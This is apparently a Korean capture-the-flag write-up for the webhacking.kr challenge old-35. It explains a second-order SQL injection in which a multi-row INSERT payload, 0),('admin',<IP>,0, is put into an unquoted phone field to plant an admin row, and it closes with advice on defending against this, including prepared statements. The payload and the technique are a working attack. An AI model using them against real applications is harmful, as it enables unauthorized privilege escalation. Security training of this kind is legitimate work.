---
title: "webhacking.kr old-35 풀이 — INSERT 다중행 주입으로 심는 2차(저장형) SQL 인젝션"
description: "webhacking.kr old-35를 통해 숫자 자리(phone)에서 터지는 INSERT 인젝션으로 'admin' 행을 하나 더 심고, 그 행을 나중에 읽는 관리자 확인 질의에서 통과하는 2차(저장형) SQL 인젝션 과정을 직접 풀어 정리한다."
date: 2026-11-02
category: Web
tags: [webhacking.kr, web, wargame, sql-injection, second-order, insert-injection, php, mysql]
---

[webhacking.kr](https://webhacking.kr)의 **old-35** 문제를 풀었다.
`SELECT`가 아니라 **`INSERT` 쿼리에서 터지는** SQL 인젝션이고,
구멍은 **전화번호(phone)가 따옴표 없이 숫자 자리에 들어간다**는 점이다.
여기서 멈추지 않고, 이 인젝션으로 **`admin` 행을 하나 더 심어 두면**
서버가 **나중에 그 행을 읽는 "관리자 확인" 질의**에서 통과시켜 준다.
입력이 바로 터지지 않고 **저장됐다가 다른 질의에서 터지는 2차(저장형) 인젝션**이다.

아래 내용은 전부 **실제로 서버에 넣어 통과를 확인한 것**이다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-35 (`/challenge/web-17/`) |
| 유형 | SQL 인젝션 (INSERT) / 2차·저장형 |
| 배점 | 35점 |
| 목표 | `chall35`에 **내 IP를 가진 `admin` 행**을 만들어 관리자 확인 질의 통과 |

페이지에는 `phone :` 입력창이 있고, 번호를 넣으면 `Done`을 출력한다.

## 2. 정보 수집 — 소스 코드

하단 `view-source`로 전체 로직이 공개된다.

```php
<?php
  $db = dbconnect();
  if($_GET['phone'] && $_GET['id']){
    if(preg_match("/\*|\/|=|select|-|#|;/i",$_GET['phone'])) exit("no hack"); // phone 필터
    if(strlen($_GET['id']) > 5) exit("no hack");                              // id 길이 제한
    if(preg_match("/admin/i",$_GET['id'])) exit("you are not admin");         // id에 admin 금지
    mysqli_query($db,
      "insert into chall35(id,ip,phone)
       values('{$_GET['id']}','{$_SERVER['REMOTE_ADDR']}',{$_GET['phone']})") or die("query error");
    echo "Done<br>";
  }
  // 관리자 확인: 내 IP로 admin 행이 있으면 통과
  $isAdmin = mysqli_fetch_array(mysqli_query($db,
    "select ip from chall35 where id='admin' and ip='{$_SERVER['REMOTE_ADDR']}'"));
  if($isAdmin['ip'] == $_SERVER['REMOTE_ADDR']){ solve(35); /* 이후 admin 행 정리 */ }
?>
```

구조를 정리하면 이렇다.

1. 폼은 `id`(숨김, 기본 `guest`)와 `phone`을 보낸다.
2. 서버는 `insert into chall35(id, ip, phone) values('<id>','<내 IP>',<phone>)` 를 실행한다.
3. 그 뒤 **항상** `select ip from chall35 where id='admin' and ip='<내 IP>'` 를 돌려,
   **내 IP를 가진 `admin` 행이 존재하면** `solve(35)` 로 통과시킨다.

## 3. 문제점 — 어디가 취약한가

### 3-1. `phone`이 따옴표 없이 숫자 자리에 들어간다

```sql
insert into chall35(id,ip,phone) values('guest','<내 IP>', {phone} )
```

`id`·`ip`는 작은따옴표로 감싸여 있지만, **`phone`은 따옴표 없이** 들어간다(정수 컨텍스트).
그래서 `phone`에 값만이 아니라 **SQL 문법**을 끼워 넣을 수 있다.
게다가 `phone` 필터(`* / = select - # ;`)에는 **콤마(`,`)·괄호(`(` `)`)·따옴표(`'`)가 빠져 있다** —
이 세 가지가 다중행 INSERT를 조립하는 재료가 된다.

### 3-2. "직접" 통과 조건을 만들 수는 없다

통과는 `id='admin'`인 행이 내 IP로 있어야 한다. 그런데

- `id` 필드는 **5자 제한** + **`admin` 문자열 금지** → `id`로는 admin 행을 못 만든다.

그러니 **`phone` 인젝션으로 INSERT 문에 행을 하나 더 붙여**,
`('admin', '<내 IP>', 0)` 을 **직접 테이블에 심는 수밖에 없다.** 이게 이 문제의 길이다.

## 4. 익스플로잇 — 다중행 INSERT 주입

### 4-1. 내 IP 확인

심을 `admin` 행의 `ip`는 **서버가 보는 내 `REMOTE_ADDR`** 와 똑같아야 한다
(관리자 확인 질의가 그 값으로 비교하기 때문). 서버가 보는 내 IP를 먼저 확인했다.

```text
REMOTE_ADDR = 14.41.76.65
```

### 4-2. phone 페이로드 설계

MySQL은 `INSERT ... VALUES (...), (...)` 처럼 **한 번에 여러 행**을 넣을 수 있다.
`phone` 자리에서 첫 괄호를 닫고, 콤마로 **두 번째 행**을 이어 붙인다.

```text
phone = 0),('admin','14.41.76.65',0
```

소스의 템플릿 `values('{id}','{ip}',{phone})` 에 넣으면 질의가 이렇게 완성된다.

```sql
insert into chall35(id,ip,phone)
values('guest','14.41.76.65',0),('admin','14.41.76.65',0)
```

- 앞 `0)` → 첫 행 `('guest','14.41.76.65',0)` 를 닫는다.
- `,('admin','14.41.76.65',0` → 두 번째 행을 시작하고,
- 템플릿의 **원래 닫는 괄호 `)`** 가 이 두 번째 행을 닫아 준다.

필터 점검: `phone` 안에 `*`·`/`·`=`·`select`·`-`·`#`·`;` **어느 것도 없다.**
필요한 콤마·괄호·따옴표는 **필터에 빠져 있어** 그대로 쓸 수 있다.

### 4-3. 실제 전송과 결과

```console
GET /challenge/web-17/?id=guest&phone=0),('admin','14.41.76.65',0
→ Done
→ old-35 Pwned. You got 35point. Congratz!
```

INSERT가 두 행을 심자, 뒤이어 도는 **관리자 확인 질의**
(`... where id='admin' and ip='14.41.76.65'`)가 방금 심은 행을 읽어 통과시켰다.

## 5. 결과

```
Done
old-35 Pwned. You got 35point. Congratz!
```

문제 목록(`chall.php`)에서도 **`✔️ old-35`** 로 풀린 것을 확인했다.

> 이 문제의 포인트는 **인젝션이 터지는 질의(INSERT)와, 통과를 판정하는 질의(SELECT)가 다르다**는 것이다.
> 내 입력은 INSERT 때 **저장**됐다가, 바로 뒤 SELECT에서 **읽히며** 효과를 낸다 — 전형적인 2차(저장형) 인젝션이다.

## 6. 왜 취약한가 — 그리고 올바른 방어

**(1) INSERT·UPDATE도 인젝션 지점이다 — SELECT만 조심하면 되는 게 아니다.**
값이 들어가는 **모든 질의**가 대상이다. 특히 **따옴표로 감싸지 않는 숫자 자리**는
문자열 필터(따옴표 막기)로는 지킬 수 없다.

**(2) 블랙리스트에 빠진 문자가 곧 익스플로잇 재료다.**
여기서는 콤마·괄호·따옴표가 빠져 있어 **다중행 INSERT**가 가능했다.
"무엇을 막을까"로 접근하면 항상 빈틈이 남는다.

```php
// 나쁨: 입력을 질의에 직접 삽입 (숫자 자리라 따옴표도 못 막는다)
$q = "insert into chall35(id,ip,phone) values('{$id}','{$ip}',{$phone})";

// 좋음: 파라미터 바인딩으로 값과 구조를 분리
$stmt = $db->prepare("insert into chall35(id,ip,phone) values(?,?,?)");
$stmt->bind_param("ssi", $id, $ip, $phone);  // phone은 정수로 바인딩
$stmt->execute();
```

**(3) 권한 판정을 "데이터 존재 여부"로 하지 마라.**
`id='admin' 행이 있나?`처럼 **공격자가 심을 수 있는 데이터**로 권한을 판단하면,
그 데이터를 만들 수 있는 순간 권한도 뚫린다. 신원·권한은 **인증된 세션**에서 가져와야 한다.

## 7. 정리

- old-35는 **INSERT의 `phone`(숫자 자리)** 에서 터지는 SQL 인젝션이다.
- `id`는 길이·`admin` 금지로 막혀 있어, **`phone` 인젝션으로 `admin` 행을 직접 심어야** 한다.
- `phone` 필터에 **콤마·괄호·따옴표가 빠져** 있어 **다중행 INSERT**(`0),('admin','<내IP>',0`)로 두 번째 행을 추가 → 뒤이은 관리자 확인 질의가 그 행을 읽어 통과.
- 교훈: **INSERT/UPDATE도 바인딩**하고, **숫자 자리도 안전하지 않으며**, **권한은 공격자가 심을 수 있는 데이터가 아니라 인증된 세션으로 판정**한다.

> "이 질의가 SELECT인가"가 아니라 "이 값이 **어느 질의로든** 구조에 끼어드는가, 그리고 그 결과를 **나중에 누가 읽는가**"를 함께 묻는다.
